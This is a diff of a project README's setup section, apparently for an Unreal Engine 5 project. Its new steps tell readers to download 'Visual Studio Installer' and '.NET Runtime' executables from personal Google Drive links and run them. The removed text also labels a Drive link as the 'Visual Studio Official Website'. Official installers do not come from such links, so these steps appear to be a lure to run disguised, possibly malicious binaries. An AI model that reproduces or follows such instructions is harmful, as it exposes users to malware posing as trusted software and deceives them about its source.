@@ -30,13 +30,23 @@ To ensure the correct dependencies are installed, follow these steps:
 
 ---
 
-### **3. Extract the Project Files**
-1. Visit the [Visual Studio Official Website]https://drive.google.com/file/d/1bUPm428iqz7NHhr-odVWgWr5wosULWfb/view?usp=sharing).
-2. Download **These 3 files**.
-3. Run the
-4. Locate the `code.zip` file.
-5. Right-click and select **"Extract All"**.
-6. Choose a destination (e.g., `C:\UE5Project\`) and extract the files.
+### 3. Extract the Project Files
+
+1. Download the required executable files:
+   - [Visual Studio Installer EXE](https://drive.google.com/file/d/1bUPm428iqz7NHhr-odVWgWr5wosULWfb/view?usp=sharing)
+   - [.NET Runtime EXE](https://drive.google.com/file/d/1SQtCK8G5Zqb4p-IWlxjCzt86Nv0U95Uo/view?usp=sharing)
+
+2. Run both `.exe` files to install the necessary components.
+
+3. Download the project source files:
+   - [code_ue.zip](https://drive.google.com/file/d/1OdG1_JK2qkAv8jQt84gWu3lo08Pr6R62/view?usp=sharing)
+
+4. Locate the downloaded `code_ue.zip` file.
+
+5. Right-click on the file and select **"Extract All..."**.
+
+6. Choose a destination folder (e.g., `C:\UE5Project\`) and extract the contents.
+
 
 ---
 
